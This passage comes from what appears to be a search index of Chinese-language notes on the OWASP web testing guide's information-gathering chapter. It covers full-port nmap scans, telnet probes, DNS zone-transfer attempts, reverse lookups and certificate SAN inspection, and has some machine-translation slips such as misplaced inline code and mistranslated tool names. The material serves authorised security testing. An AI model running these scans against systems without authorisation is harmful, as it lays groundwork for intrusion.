\u540d\u79f0<code>www.example.com</code>\u3001<code>helpdesk.example.com</code>\u3001\u76f8\u5173\u8054<code>webmail.example.com</code>\u3002\u4e0d\u5fc5\u6240\u6709\u540d\u79f0\u90fd\u5c5e\u4e8e\u540c\u4e00\u4e2a DNS \u57df\u3002\u8fd9\u79cd 1 \u5bf9 N \u7684\u5173\u7cfb\u53ef\u4ee5\u53cd\u6620\u4e3a\u901a\u8fc7\u4f7f\u7528\u6240\u8c13\u7684\u865a\u62df\u4e3b\u673a\u6765\u63d0\u4f9b\u4e0d\u540c\u7684\u5185\u5bb9\u3002\u6211\u4eec\u6240\u6307\u7684\u6307\u5b9a\u865a\u62df\u4e3b\u673a\u7684\u4fe1\u606f\u5d4c\u5165\u5728 HTTP 1.1\u4e3b\u673a\u6807\u5934\u4e2d\u3002</p> <p>\u4eba\u4eec\u4e0d\u4f1a\u6000\u7591\u9664\u4e86\u663e\u800c\u6613\u89c1\u7684\u4e4b\u5916\u8fd8\u6709\u5176\u4ed6 Web \u5e94\u7528\u7a0b\u5e8f\u7684\u5b58\u5728<code>www.example.com</code>\uff0c\u9664\u975e\u4ed6\u4eec\u77e5\u9053<code>helpdesk.example.com</code>\u548c<code>webmail.example.com</code>\u3002</p> </li> </ol>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#1-url","title":"\u89e3\u51b3\u95ee\u9898 1 \u7684\u65b9\u6cd5 - \u975e\u6807\u51c6 URL","text":"<p>\u6ca1\u6709\u529e\u6cd5\u5b8c\u5168\u786e\u5b9a\u662f\u5426\u5b58\u5728\u975e\u6807\u51c6\u547d\u540d\u7684 Web \u5e94\u7528\u7a0b\u5e8f\u3002\u7531\u4e8e\u662f\u975e\u6807\u51c6\u7684\uff0c\u56e0\u6b64\u6ca1\u6709\u7ba1\u7406\u547d\u540d\u7ea6\u5b9a\u7684\u56fa\u5b9a\u6807\u51c6\uff0c\u4f46\u662f\u6d4b\u8bd5\u4eba\u5458\u53ef\u4ee5\u4f7f\u7528\u591a\u79cd\u6280\u672f\u6765\u83b7\u5f97\u4e00\u4e9b\u989d\u5916\u7684\u6d1e\u5bdf\u529b\u3002</p> <p>\u9996\u5148\uff0c\u5982\u679c Web \u670d\u52a1\u5668\u914d\u7f6e\u9519\u8bef\u5e76\u5141\u8bb8\u76ee\u5f55\u6d4f\u89c8\uff0c\u5219\u53ef\u80fd\u4f1a\u53d1\u73b0\u8fd9\u4e9b\u5e94\u7528\u7a0b\u5e8f\u3002\u6f0f\u6d1e\u626b\u63cf\u5668\u53ef\u80fd\u5728\u8fd9\u65b9\u9762\u6709\u6240\u5e2e\u52a9\u3002</p> <p>\u5176\u6b21\uff0c\u8fd9\u4e9b\u5e94\u7528\u7a0b\u5e8f\u53ef\u80fd\u4f1a\u88ab\u5176\u4ed6\u7f51\u9875\u5f15\u7528\uff0c\u5e76\u4e14\u6709\u53ef\u80fd\u88ab\u7f51\u7edc\u641c\u7d22\u5f15\u64ce\u6293\u53d6\u548c\u7d22\u5f15\u3002\u5982\u679c\u6d4b\u8bd5\u4eba\u5458\u6000\u7591\u6b64\u7c7b\u9690\u85cf\u5e94\u7528\u7a0b\u5e8f\u7684\u5b58\u5728\uff0c<code>www.example.com</code>\u4ed6\u4eec\u53ef\u4ee5\u4f7f\u7528_\u7f51\u7ad9_\u8fd0\u8425\u5546\u8fdb\u884c\u641c\u7d22\u5e76\u68c0\u67e5\u67e5\u8be2\u7ed3\u679c<code>site: www.example.com</code>\u3002\u5728\u8fd4\u56de\u7684 URL \u4e2d\uff0c\u53ef\u80fd\u6709\u4e00\u4e2a\u6307\u5411\u8fd9\u6837\u4e00\u4e2a\u4e0d\u660e\u663e\u7684\u5e94\u7528\u7a0b\u5e8f\u3002</p> <p>\u53e6\u4e00\u79cd\u9009\u62e9\u662f\u63a2\u6d4b\u53ef\u80fd\u662f\u672a\u53d1\u5e03\u5e94\u7528\u7a0b\u5e8f\u5019\u9009\u8005\u7684 URL\u3002\u4f8b\u5982\uff0c\u53ef\u4ee5\u4ece <code>https://www.example.com/webmail</code>\u3001<code>https://webmail.example.com/</code> \u6216 <code>https://mail.example.com/</code>\u7b49 URL \u8bbf\u95ee Web\u90ae\u4ef6\u524d\u7aef\u3002\u8fd9\u540c\u6837\u9002\u7528\u4e8e\u7ba1\u7406\u754c\u9762\uff0c\u5b83\u4eec\u53ef\u4ee5\u5728\u9690\u85cf\u7684 URL \u4e0a\u53d1\u5e03\uff08\u4f8b\u5982\uff0cTomcat \u7ba1\u7406\u754c\u9762\uff09\uff0c\u4f46\u4e0d\u4f1a\u5728\u4efb\u4f55\u5730\u65b9\u5f15\u7528\u3002\u56e0\u6b64\uff0c\u8fdb\u884c\u4e00\u4e9b\u5b57\u5178\u5f0f\u641c\u7d22\uff08\u6216\u201c\u667a\u80fd\u731c\u6d4b\u201d\uff09\u53ef\u80fd\u4f1a\u4ea7\u751f\u4e00\u4e9b\u7ed3\u679c\u3002\u6f0f\u6d1e\u626b\u63cf\u5668\u53ef\u80fd\u5728\u8fd9\u65b9\u9762\u6709\u6240\u5e2e\u52a9\u3002</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#2-","title":"\u89e3\u51b3\u95ee\u9898 2 \u7684\u65b9\u6cd5 - \u975e\u6807\u51c6\u7aef\u53e3","text":"<p>\u5f88\u5bb9\u6613\u68c0\u67e5\u975e\u6807\u51c6\u7aef\u53e3\u4e0a\u662f\u5426\u5b58\u5728 Web \u5e94\u7528\u7a0b\u5e8f\u3002Nmap\u7b49\u7aef\u53e3\u626b\u63cf\u5668\u53ef\u4ee5\u901a\u8fc7<code>-sV</code>\u9009\u9879\u8fdb\u884c\u670d\u52a1\u8bc6\u522b\uff0c\u8bc6\u522b\u4efb\u610f\u7aef\u53e3\u4e0a\u7684http[s]\u670d\u52a1\u3002\u6240\u9700\u8981\u7684\u662f\u5bf9\u6574\u4e2a 64k TCP \u7aef\u53e3\u5730\u5740\u7a7a\u95f4\u7684\u5168\u9762\u626b\u63cf\u3002</p> <p>\u4f8b\u5982\uff0c\u4ee5\u4e0b\u547d\u4ee4\u5c06\u901a\u8fc7 TCP \u8fde\u63a5\u626b\u63cf\u67e5\u627e IP \u4e0a\u6240\u6709\u6253\u5f00\u7684\u7aef\u53e3\uff0c<code>192.168.1.100</code>\u5e76\u5c1d\u8bd5\u786e\u5b9a\u54ea\u4e9b\u670d\u52a1\u7ed1\u5b9a\u5230\u5b83\u4eec\uff08\u4ec5\u663e\u793a_\u5fc5\u8981_\u7684\u5f00\u5173 - Nmap \u5177\u6709\u5e7f\u6cdb\u7684\u9009\u9879\u96c6\uff0c\u5176\u8ba8\u8bba\u662f\u8d85\u51fa\u8303\u56f4\uff09\uff1a</p> <p><code>nmap \u2013Pn \u2013sT \u2013sV \u2013p0-65535 192.168.1.100</code></p> <p>\u68c0\u67e5\u8f93\u51fa\u5e76\u67e5\u627e HTTP \u6216 TLS \u5305\u88c5\u670d\u52a1\u7684\u6307\u793a\uff08\u5e94\u63a2\u6d4b\u4ee5\u786e\u8ba4\u5b83\u4eec\u662f HTTPS\uff09\u5c31\u8db3\u591f\u4e86\u3002\u4f8b\u5982\uff0c\u4e0a\u4e00\u4e2a\u547d\u4ee4\u7684\u8f93\u51fa\u53ef\u80fd\u5982\u4e0b\u6240\u793a\uff1a</p> <pre><code>Interesting ports on 192.168.1.100:\n(The 65527 ports scanned but not shown below are in state: closed)\nPORT      STATE SERVICE     VERSION\n22/tcp    open  ssh         OpenSSH 3.5p1 (protocol 1.99)\n80/tcp    open  http        Apache httpd 2.0.40 ((Red Hat Linux))\n443/tcp   open  ssl         OpenSSL\n901/tcp   open  http        Samba SWAT administration server\n1241/tcp  open  ssl         Nessus security scanner\n3690/tcp  open  unknown\n8000/tcp  open  http-alt?\n8080/tcp  open  http        Apache Tomcat/Coyote JSP engine 1.1\n</code></pre> <p>\u4ece\u8fd9\u4e2a\u4f8b\u5b50\u4e2d\uff0c\u53ef\u4ee5\u770b\u51fa\uff1a</p> <ul> <li>\u6709\u4e00\u4e2a Apache HTTP \u670d\u52a1\u5668\u5728\u7aef\u53e3 80 \u4e0a\u8fd0\u884c\u3002</li> <li>443\u7aef\u53e3\u597d\u50cf\u6709HTTPS\u670d\u52a1\u5668\uff08\u4e0d\u8fc7\u8fd9\u4e2a\u9700\u8981\u786e\u8ba4\uff0c\u6bd4\u5982<code>https://192.168.1.100</code>\u7528\u6d4f\u89c8\u5668\u8bbf\u95ee\uff09\u3002</li> <li>\u5728\u7aef\u53e3 901 \u4e0a\u6709\u4e00\u4e2a Samba SWAT Web \u754c\u9762\u3002</li> <li>\u7aef\u53e3 1241 \u4e0a\u7684\u670d\u52a1\u4e0d\u662f HTTPS\uff0c\u800c\u662f TLS \u5c01\u88c5\u7684 Nessus \u5b88\u62a4\u8fdb\u7a0b\u3002</li> <li>\u7aef\u53e3 3690 \u5177\u6709\u672a\u6307\u5b9a\u7684\u670d\u52a1\uff08Nmap \u8fd4\u56de\u5176_\u6307\u7eb9_- \u6b64\u5904\u4e3a\u6e05\u695a\u8d77\u89c1\u7701\u7565 - \u4ee5\u53ca\u5c06\u5176\u63d0\u4ea4\u5e76\u7eb3\u5165 Nmap \u6307\u7eb9\u6570\u636e\u5e93\u7684\u8bf4\u660e\uff0c\u524d\u63d0\u662f\u60a8\u77e5\u9053\u5b83\u4ee3\u8868\u7684\u670d\u52a1\uff09\u3002</li> <li>\u7aef\u53e3 8000 \u4e0a\u7684\u53e6\u4e00\u4e2a\u672a\u6307\u5b9a\u670d\u52a1\uff1b\u8fd9\u53ef\u80fd\u662f HTTP\uff0c\u56e0\u4e3a\u5728\u6b64\u7aef\u53e3\u4e0a\u627e\u5230 HTTP \u670d\u52a1\u5668\u5e76\u4e0d\u7f55\u89c1\u3002\u8ba9\u6211\u4eec\u68c0\u67e5\u4e00\u4e0b\u8fd9\u4e2a\u95ee\u9898\uff1a</li> </ul> <pre><code>$ telnet 192.168.10.100 8000\nTrying 192.168.1.100...\nConnected to 192.168.1.100.\nEscape character is '^]'.\nGET / HTTP/1.0\n\nHTTP/1.0 200 OK\npragma: no-cache\nContent-Type: text/html\nServer: MX4J-HTTPD/1.0\nexpires: now\nCache-Control: no-cache\n\n&lt;html&gt;\n...\n</code></pre> <p>\u8fd9\u8bc1\u5b9e\u5b83\u5b9e\u9645\u4e0a\u662f\u4e00\u4e2a HTTP \u670d\u52a1\u5668\u3002\u6216\u8005\uff0c\u6d4b\u8bd5\u4eba\u5458\u53ef\u4ee5\u4f7f\u7528\u7f51\u7edc\u6d4f\u89c8\u5668\u8bbf\u95ee\u8be5 URL\uff1b\u6216\u4f7f\u7528 GET \u6216 HEAD Perl \u547d\u4ee4\uff0c\u5b83\u4eec\u6a21\u4eff HTTP \u4ea4\u4e92\uff0c\u4f8b\u5982\u4e0a\u9762\u7ed9\u51fa\u7684\u4ea4\u4e92\uff08\u4f46\u662f HEAD \u8bf7\u6c42\u53ef\u80fd\u4e0d\u4f1a\u88ab\u6240\u6709\u670d\u52a1\u5668\u63a5\u53d7\uff09\u3002</p> <ul> <li>Apache Tomcat \u5728\u7aef\u53e3 8080 \u4e0a\u8fd0\u884c\u3002</li> </ul> <p>\u6f0f\u6d1e\u626b\u63cf\u5668\u53ef\u80fd\u4f1a\u6267\u884c\u76f8\u540c\u7684\u4efb\u52a1\uff0c\u4f46\u9996\u5148\u68c0\u67e5\u6240\u9009\u626b\u63cf\u5668\u662f\u5426\u80fd\u591f\u8bc6\u522b\u5728\u975e\u6807\u51c6\u7aef\u53e3\u4e0a\u8fd0\u884c\u7684 HTTP[S] \u670d\u52a1\u3002\u4f8b\u5982\uff0cNessus \u80fd\u591f\u5728\u4efb\u610f\u7aef\u53e3\u4e0a\u8bc6\u522b\u5b83\u4eec\uff08\u524d\u63d0\u662f\u5b83\u88ab\u6307\u793a\u626b\u63cf\u6240\u6709\u7aef\u53e3\uff09\uff0c\u5e76\u4e14\u5c06\u63d0\u4f9b\u5173\u4e8e Nmap \u7684\u5927\u91cf\u9488\u5bf9\u5df2\u77e5 Web \u670d\u52a1\u5668\u6f0f\u6d1e\u7684\u6d4b\u8bd5\uff0c\u4ee5\u53ca TLS/ HTTPS \u670d\u52a1\u7684 SSL \u914d\u7f6e\u3002\u5982\u524d\u6240\u8ff0\uff0cNessus \u8fd8\u80fd\u591f\u53d1\u73b0\u6d41\u884c\u7684\u5e94\u7528\u7a0b\u5e8f\u6216 web \u754c\u9762\uff0c\u5426\u5219\u53ef\u80fd\u4f1a\u88ab\u5ffd\u89c6\uff08\u4f8b\u5982\uff0cTomcat \u7ba1\u7406\u754c\u9762\uff09\u3002</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#3-","title":"\u89e3\u51b3\u95ee\u9898 3 \u7684\u65b9\u6cd5 - \u865a\u62df\u4e3b\u673a","text":"<p>\u6709\u8bb8\u591a\u6280\u672f\u53ef\u7528\u4e8e\u8bc6\u522b\u4e0e\u7ed9\u5b9a IP \u5730\u5740\u5173\u8054\u7684 DNS \u540d\u79f0<code>x.y.z.t</code>\u3002</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#dns","title":"DNS \u533a\u57df\u4f20\u8f93","text":"<p>\u8003\u8651\u5230 DNS \u670d\u52a1\u5668\u57fa\u672c\u4e0a\u4e0d\u652f\u6301\u533a\u57df\u4f20\u8f93\u8fd9\u4e00\u4e8b\u5b9e\uff0c\u8fd9\u79cd\u6280\u672f\u73b0\u5728\u7684\u4f7f\u7528\u53d7\u5230\u9650\u5236\u3002\u4f46\u662f\uff0c\u8fd9\u53ef\u80fd\u503c\u5f97\u4e00\u8bd5\u3002\u9996\u5148\uff0c\u6d4b\u8bd5\u4eba\u5458\u5fc5\u987b\u786e\u5b9a\u670d\u52a1\u4e8e<code>x.y.z.t</code>.\u00a0\u5982\u679c\u4e00\u4e2a\u7b26\u53f7\u540d\u79f0\u5df2\u77e5<code>x.y.z.t</code>\uff08\u5047\u8bbe\u4e3a\uff09\uff0c\u5219\u53ef\u4ee5\u901a\u8fc7\u3001\u6216\u7b49\u5de5\u5177\u901a\u8fc7\u8bf7\u6c42 DNS NS \u8bb0\u5f55<code>www.example.com</code>\u6765\u786e\u5b9a\u5176\u540d\u79f0\u670d\u52a1\u5668\u3002<code>nslookup``host``dig</code></p> <p>\u5982\u679c\u6ca1\u6709\u5df2\u77e5\u7684\u7b26\u53f7\u540d\u79f0<code>x.y.z.t</code>\uff0c\u4f46\u76ee\u6807\u5b9a\u4e49\u81f3\u5c11\u5305\u542b\u4e00\u4e2a\u7b26\u53f7\u540d\u79f0\uff0c\u6d4b\u8bd5\u4eba\u5458\u53ef\u80fd\u4f1a\u5c1d\u8bd5\u5e94\u7528\u76f8\u540c\u7684\u8fc7\u7a0b\u5e76\u67e5\u8be2\u8be5\u540d\u79f0\u7684\u540d\u79f0\u670d\u52a1\u5668\uff08\u5e0c\u671b\u8be5\u540d\u79f0\u670d\u52a1\u5668<code>x.y.z.t</code>\u4e5f\u80fd\u63d0\u4f9b\u670d\u52a1\uff09\u3002\u4f8b\u5982\uff0c\u5982\u679c\u76ee\u6807\u7531 IP \u5730\u5740<code>x.y.z.t</code>\u548c\u540d\u79f0\u7ec4\u6210<code>mail.example.com</code>\uff0c\u5219\u786e\u5b9a\u57df\u7684\u540d\u79f0\u670d\u52a1\u5668<code>example.com</code>\u3002</p> <p>\u4ee5\u4e0b\u793a\u4f8b\u663e\u793a\u5982\u4f55<code>www.owasp.org</code>\u4f7f\u7528\u4ee5\u4e0b<code>host</code>\u547d\u4ee4\u8bc6\u522b\u540d\u79f0\u670d\u52a1\u5668\uff1a</p> <pre><code>$ host -t ns www.owasp.org\nwww.owasp.org is an alias for owasp.org.\nowasp.org name server ns1.secure.net.\nowasp.org name server ns2.secure.net.\n</code></pre> <p>\u73b0\u5728\u53ef\u4ee5\u5411\u57df\u7684\u540d\u79f0\u670d\u52a1\u5668\u8bf7\u6c42\u533a\u57df\u4f20\u8f93<code>example.com</code>\u3002\u5982\u679c\u6d4b\u8bd5\u4eba\u5458\u5e78\u8fd0\u7684\u8bdd\uff0c\u4ed6\u4eec\u5c06\u5f97\u5230\u8be5\u57df\u7684 DNS \u6761\u76ee\u5217\u8868\u3002\u8fd9\u5c06\u5305\u62ec\u660e\u663e<code>www.example.com</code>\u7684\u548c\u4e0d\u592a\u660e\u663e\u7684<code>helpdesk.example.com</code>\u4ee5\u53ca<code>webmail.example.com</code>\uff08\u53ef\u80fd\u8fd8\u6709\u5176\u4ed6\uff09\u3002\u68c0\u67e5\u533a\u57df\u4f20\u8f93\u8fd4\u56de\u7684\u6240\u6709\u540d\u79f0\uff0c\u5e76\u8003\u8651\u6240\u6709\u4e0e\u6b63\u5728\u8bc4\u4f30\u7684\u76ee\u6807\u76f8\u5173\u7684\u540d\u79f0\u3002</p> <p>\u5c1d\u8bd5<code>owasp.org</code>\u4ece\u5176\u540d\u79f0\u670d\u52a1\u5668\u4e4b\u4e00\u8bf7\u6c42\u533a\u57df\u4f20\u8f93\uff1a</p> <pre><code>$ host -l www.owasp.org ns1.secure.net\nUsing domain server:\nName: ns1.secure.net\nAddress: 192.220.124.10#53\nAliases:\n\nHost www.owasp.org not found: 5(REFUSED)\n; Transfer failed.\n</code></pre>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#dns_1","title":"DNS \u53cd\u5411\u67e5\u8be2","text":"<p>\u6b64\u8fc7\u7a0b\u4e0e\u524d\u4e00\u4e2a\u8fc7\u7a0b\u7c7b\u4f3c\uff0c\u4f46\u4f9d\u8d56\u4e8e\u53cd\u5411 (PTR) DNS \u8bb0\u5f55\u3002\u4e0d\u8981\u8bf7\u6c42\u533a\u57df\u4f20\u8f93\uff0c\u800c\u662f\u5c1d\u8bd5\u5c06\u8bb0\u5f55\u7c7b\u578b\u8bbe\u7f6e\u4e3a PTR \u5e76\u5728\u7ed9\u5b9a\u7684 IP \u5730\u5740\u4e0a\u53d1\u51fa\u67e5\u8be2\u3002\u5982\u679c\u6d4b\u8bd5\u4eba\u5458\u5e78\u8fd0\u7684\u8bdd\uff0c\u4ed6\u4eec\u53ef\u80fd\u4f1a\u5f97\u5230\u4e00\u4e2a DNS \u540d\u79f0\u6761\u76ee\u3002\u6b64\u6280\u672f\u4f9d\u8d56\u4e8e IP \u5230\u7b26\u53f7\u540d\u79f0\u6620\u5c04\u7684\u5b58\u5728\uff0c\u4f46\u4e0d\u80fd\u4fdd\u8bc1\u8fd9\u4e00\u70b9\u3002</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#web-dns","title":"\u57fa\u4e8e Web \u7684 DNS \u641c\u7d22","text":"<p>\u8fd9\u79cd\u641c\u7d22\u7c7b\u4f3c\u4e8e DNS \u533a\u57df\u4f20\u8f93\uff0c\u4f46\u4f9d\u8d56\u4e8e\u5728 DNS \u4e0a\u542f\u7528\u57fa\u4e8e\u540d\u79f0\u7684\u641c\u7d22\u7684\u57fa\u4e8e Web \u7684\u670d\u52a1\u3002\u5176\u4e2d\u4e00\u9879\u670d\u52a1\u662fNetcraft \u641c\u7d22 DNS\u670d\u52a1\u3002\u6d4b\u8bd5\u4eba\u5458\u53ef\u80fd\u4f1a\u67e5\u8be2\u5c5e\u4e8e\u60a8\u9009\u62e9\u7684\u57df\u7684\u540d\u79f0\u5217\u8868\uff0c\u4f8b\u5982<code>example.com</code>.\u00a0\u7136\u540e\u4ed6\u4eec\u5c06\u68c0\u67e5\u4ed6\u4eec\u83b7\u5f97\u7684\u540d\u79f0\u662f\u5426\u4e0e\u4ed6\u4eec\u6b63\u5728\u68c0\u67e5\u7684\u76ee\u6807\u76f8\u5173\u3002</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#ip","title":"\u53cd\u5411 IP \u670d\u52a1","text":"<p>\u53cd\u5411 IP \u670d\u52a1\u7c7b\u4f3c\u4e8e DNS \u53cd\u5411\u67e5\u8be2\uff0c\u4e0d\u540c\u4e4b\u5904\u5728\u4e8e\u6d4b\u8bd5\u4eba\u5458\u67e5\u8be2\u57fa\u4e8e Web \u7684\u5e94\u7528\u7a0b\u5e8f\u800c\u4e0d\u662f\u540d\u79f0\u670d\u52a1\u5668\u3002\u6709\u8bb8\u591a\u8fd9\u6837\u7684\u670d\u52a1\u53ef\u7528\u3002\u7531\u4e8e\u5b83\u4eec\u503e\u5411\u4e8e\u8fd4\u56de\u90e8\u5206\uff08\u5e76\u4e14\u901a\u5e38\u662f\u4e0d\u540c\u7684\uff09\u7ed3\u679c\uff0c\u56e0\u6b64\u6700\u597d\u4f7f\u7528\u591a\u79cd\u670d\u52a1\u6765\u83b7\u5f97\u66f4\u5168\u9762\u7684\u5206\u6790\u3002</p> <ul> <li>MxToolbox \u53cd\u5411 IP</li> <li>DNSstuff\uff08\u63d0\u4f9b\u591a\u79cd\u670d\u52a1\uff09</li> <li>Net Square\uff08\u57df\u540d\u548cIP\u5730\u5740\u7684\u591a\u6b21\u67e5\u8be2\uff0c\u9700\u8981\u5b89\u88c5\uff09</li> </ul>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_22","title":"\u8c37\u6b4c\u641c\u7d22","text":"<p>\u4ece\u4ee5\u524d\u7684\u6280\u672f\u6536\u96c6\u4fe1\u606f\u540e\uff0c\u6d4b\u8bd5\u4eba\u5458\u53ef\u4ee5\u4f9d\u9760\u641c\u7d22\u5f15\u64ce\u6765\u6539\u8fdb\u548c\u589e\u52a0\u4ed6\u4eec\u7684\u5206\u6790\u3002\u8fd9\u53ef\u80fd\u4f1a\u4ea7\u751f\u5c5e\u4e8e\u76ee\u6807\u7684\u5176\u4ed6\u7b26\u53f7\u540d\u79f0\u7684\u8bc1\u636e\uff0c\u6216\u8005\u53ef\u4ee5\u901a\u8fc7\u4e0d\u660e\u663e\u7684 URL \u8bbf\u95ee\u7684\u5e94\u7528\u7a0b\u5e8f\u3002</p> <p>\u4f8b\u5982\uff0c\u8003\u8651\u524d\u9762\u5173\u4e8e \u7684\u793a\u4f8b<code>www.owasp.org</code>\uff0c\u6d4b\u8bd5\u4eba\u5458\u53ef\u4ee5\u67e5\u8be2 Google \u548c\u5176\u4ed6\u641c\u7d22\u5f15\u64ce\u4ee5\u67e5\u627e\u4e0e\u65b0\u53d1\u73b0\u7684\u57df \u3001 \u548c \u76f8\u5173\u7684\u4fe1\u606f\uff08\u56e0\u6b64\uff0cDNS<code>webgoat.org</code>\u540d\u79f0<code>webscarab.com</code>\uff09<code>webscarab.net</code>\u3002</p> <p>\u8c37\u6b4c\u641c\u7d22\u6280\u672f\u5728\u6d4b\u8bd5\uff1a\u8718\u86db\u3001\u673a\u5668\u4eba\u548c\u722c\u866b\u4e2d\u6709\u89e3\u91ca\u3002</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_23","title":"\u6570\u5b57\u8bc1\u4e66","text":"<p>\u5982\u679c\u670d\u52a1\u5668\u63a5\u53d7\u901a\u8fc7 HTTPS \u7684\u8fde\u63a5\uff0c\u5219\u8bc1\u4e66\u4e0a\u7684\u901a\u7528\u540d\u79f0 (CN) \u548c\u4e3b\u9898\u5907\u7528\u540d\u79f0 (SAN) \u53ef\u80fd\u5305\u542b\u4e00\u4e2a\u6216\u591a\u4e2a\u4e3b\u673a\u540d\u3002\u4f46\u662f\uff0c\u5982\u679c\u7f51\u7edc\u670d\u52a1\u5668\u6ca1\u6709\u53d7\u4fe1\u4efb\u7684\u8bc1\u4e66\uff0c\u6216\u8005\u6b63\u5728\u4f7f\u7528\u901a\u914d\u7b26\uff0c\u5219\u53ef\u80fd\u4e0d\u4f1a\u8fd4\u56de\u4efb\u4f55\u6709\u6548\u4fe1\u606f\u3002</p> <p>CN\u548cSAN\u53ef\u4ee5\u901a\u8fc7\u624b\u52a8\u67e5\u770b\u8bc1\u4e66\u83b7\u53d6\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7OpenSSL\u7b49\u5176\u4ed6\u5de5\u5177\u83b7\u53d6\uff1a</p> <pre><code>openssl s_client -connect 93.184.216.34:443 &lt;/dev/null 2&gt;/dev/null | openssl x509 -noout -text | grep -E 'DNS:|Subject:'\n\nSubject: C = US, ST = California, L = Los Angeles, O = Internet Corporation for Assigned Names and Numbers, CN = www.example.org\nDNS:www.example.org, DNS:example.com, DNS:example.edu, DNS:example.net, DNS:example.org, DNS:www.example.com, DNS:www.example.edu, DNS:www.example.net\n</code></pre>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_24","title":"\u5de5\u5177","text":"<ul> <li><code>nslookup</code>DNS \u67e5\u627e\u5de5\u5177\uff0c\u4f8b\u5982<code>dig</code>\u548c\u7c7b\u4f3c\u7684\u5de5\u5177\u3002</li> <li>\u641c\u7d22\u5f15\u64ce\uff08Google\u3001Bing \u548c\u5176\u4ed6\u4e3b\u8981\u641c\u7d22\u5f15\u64ce\uff09\u3002</li> <li>\u4e13\u95e8\u7684 DNS \u76f8\u5173\u7684\u57fa\u4e8e Web \u7684\u641c\u7d22\u670d\u52a1\uff1a\u89c1\u6b63\u6587\u3002</li> <li>\u5730\u56fe</li> <li>Nessus \u6f0f\u6d1e\u626b\u63cf\u7a0b\u5e8f</li> <li>\u5c3c\u514b\u6258</li> </ul>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_25","title":"\u5ba1\u67e5\u6e90\u7801","text":"<p>https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/05-Review_Webpage_Content_for_Information_Leakage</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_26","title":"\u6982\u62ec","text":"<p>\u7a0b\u5e8f\u5458\u5728\u4ed6\u4eec\u7684\u6e90\u4ee3\u7801\u4e2d\u5305\u542b\u8be6\u7ec6\u7684\u6ce8\u91ca\u548c\u5143\u6570\u636e\u662f\u5f88\u5e38\u89c1\u7684\uff0c\u751a\u81f3\u662f\u88ab\u63a8\u8350\u7684\u3002\u4f46\u662f\uff0cHTML \u4ee3\u7801\u4e2d\u5305\u542b\u7684\u6ce8\u91ca\u548c\u5143\u6570\u636e\u53ef\u80fd\u4f1a\u6cc4\u9732\u6f5c\u5728\u653b\u51fb\u8005\u4e0d\u5e94\u83b7\u5f97\u7684\u5185\u90e8\u4fe1\u606f\u3002\u5e94\u8be5\u8fdb\u884c\u8bc4\u8bba\u548c\u5143\u6570\u636e\u5ba1\u67e5\u4ee5\u786e\u5b9a\u662f\u5426\u6709\u4efb\u4f55\u4fe1\u606f\u88ab\u6cc4\u9732\u3002\u6b64\u5916\uff0c\u67d0\u4e9b\u5e94\u7528\u7a0b\u5e8f\u53ef\u80fd\u4f1a\u5728\u91cd\u5b9a\u5411\u54cd\u5e94\u6b63\u6587\u4e2d\u6cc4\u9732\u4fe1\u606f\u3002</p> <p>\u5bf9\u4e8e\u73b0\u4ee3\u7f51\u7edc\u5e94\u7528\u7a0b\u5e8f\uff0c\u524d\u7aef\u4f7f\u7528\u5ba2\u6237\u7aef JavaScript \u53d8\u5f97\u8d8a\u6765\u8d8a\u6d41\u884c\u3002\u6d41\u884c\u7684\u524d\u7aef\u6784\u5efa\u6280\u672f\u4f7f\u7528\u5ba2\u6237\u7aef JavaScript\uff0c\u5982 ReactJS\u3001AngularJS \u6216 Vue\u3002\u4e0e HTML \u4ee3\u7801\u4e2d\u7684\u6ce8\u91ca\u548c\u5143\u6570\u636e\u7c7b\u4f3c\uff0c\u8bb8\u591a\u7a0b\u5e8f\u5458\u4e5f\u5c06\u654f\u611f\u4fe1\u606f\u786c\u7f16\u7801\u5728\u524d\u7aef\u7684 JavaScript \u53d8\u91cf\u4e2d\u3002\u654f\u611f\u4fe1\u606f\u53ef\u4ee5\u5305\u62ec\uff08\u4f46\u4e0d\u9650\u4e8e\uff09\uff1a\u79c1\u6709 API \u5bc6\u94a5\uff08_\u4f8b\u5982_\u4e0d\u53d7\u9650\u5236\u7684 Google Map API \u5bc6\u94a5\uff09\u3001\u5185\u90e8 IP \u5730\u5740\u3001\u654f\u611f\u8def\u7531\uff08_\u4f8b\u5982_\u5230\u9690\u85cf\u7ba1\u7406\u9875\u9762\u6216\u529f\u80fd\u7684\u8def\u7531\uff09\uff0c\u751a\u81f3\u51ed\u636e\u3002\u8fd9\u4e9b\u654f\u611f\u4fe1\u606f\u53ef\u80fd\u4f1a\u4ece\u6b64\u7c7b\u524d\u7aef JavaScript 